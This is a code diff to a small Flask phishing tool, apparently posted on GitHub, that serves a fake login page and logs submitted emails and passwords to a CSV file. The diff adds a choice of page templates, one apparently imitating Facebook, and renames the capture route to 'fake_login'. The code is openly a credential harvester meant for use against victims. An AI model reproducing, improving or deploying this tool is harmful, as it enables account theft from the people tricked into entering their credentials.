@@ -1,8 +1,13 @@
 from flask import Flask , render_template ,  request
 app = Flask(__name__)
 print("By bossgeeg123456 : https://github.com/BoszGTec")
+
 print("Follow This Format : <Your Path To>/login fake/")
 path=input("Your Path :  ")
+
+print("Choose page [index.html] [face.html]")
+page=input("page :  ")
+
 with open(path+"Email+Password.csv",mode='w') as f :
     f.write("""Email , Password""")
     f.close()
@@ -12,10 +17,10 @@ app.static_folder=path+"file"
 app.template_folder=path+"file"
 @app.route("/") 
 def index():
- return render_template("index.html")
+ return render_template(page)
 
 @app.route("/login") 
-def fack_login() :
+def fake_login() :
   e=request.args.get("email")
   p=request.args.get("password")
   with open(path+"Email+Password.csv",mode='a') as f :
